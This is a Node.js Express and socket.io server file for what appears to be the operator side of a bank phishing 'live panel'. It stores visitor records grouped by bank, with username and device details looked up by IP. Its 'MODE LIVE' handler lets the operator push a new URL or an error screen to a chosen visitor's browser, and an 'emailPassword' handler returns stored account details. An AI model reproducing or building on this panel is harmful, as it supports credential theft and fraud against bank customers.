const express = require("express")
const { createServer } = require("http")
const { Server } = require("socket.io")
const { createUserController } = require("./controller/user/createUser.controller")
const { deleteUser } = require("./controller/user/deleteUser.controller")
const { getAllUser } = require("./controller/user/getAllUser.controller")
const { connectdb } = require("./db/connectdb")
const cors = require('cors')
const { seed } = require("./factory/seed")
const { deleteAllBank } = require("./controller/user/deleteAllUser.controller")
const { disconnectLive } = require("./controller/live/disconnectLive.controller")
const { getUser } = require("./controller/user/getUser.controller")
const { changeLive } = require("./controller/live/changeLive.controller")
require('dotenv').config()

connectdb()

const app = express()
const httpServer = createServer(app)
const io = new Server(httpServer, { 
    cors: ['https://*.repl', 'http://localhost:3000'] 
})

app.use(cors())

io.on("connection", async(socket) => {

    socket.on('[User] getAll', async () => {
        const users = await getAllUser()
        return socket.emit('[User] emitAll', users)
    })
    
    socket.on('(Usuario) crear', async (user) => {
        const usuario = await createUserController({user})
        return socket.broadcast.emit('(Usuario) nuevoUsuario', usuario)
    })
    
    socket.on('[User] delete', async ({_id}) => {
        if(_id == null) return
        await deleteUser({_id})
        return socket.broadcast.emit('[User] deleteUser', _id)
    })

    // BORRAR TODOS LOS USUARIOS SEGUN EL BANCO
    socket.on('[User] deleteAll', async ({bank}) => {
        if(bank == null) return
        await deleteAllBank({bank})
        return socket.broadcast.emit('[User] deleteAllBankEmit', {bank})
    })


    // MODE LIVE
    socket.on('[LIVE] changeUrlPanel', async({user}) => { 
        const {socketID, viewError, url } = user
        const newUser = await changeLive({user}) 
        io.to(socketID).emit('[LIVE] changeUrlClient', {url, viewError} )
        socket.emit('[User] newUser', newUser)
    })

    socket.on('disconnect', async(e) => {
        const usuario = await disconnectLive({socketID: socket.id}) 
        if(usuario === null) return
        console.log('hizo el caster')
        return socket.broadcast.emit('[User] newUser', usuario)
    })

    socket.on('[LIVE] emailPassword', async(ip, cb) => {
        try {
            const {username, typeDevice, numberDevice} = await getUser({ip: ip.ip})
            cb({username, typeDevice, numberDevice})
        } catch (error) {
            
        }
    })
})

app.get('/', (req, res) => console.log('testeando'))

// seed(1000)

app.use(express.static("public"))


httpServer.listen(3001, () => console.log(`conectado al servidor ${3001}`) )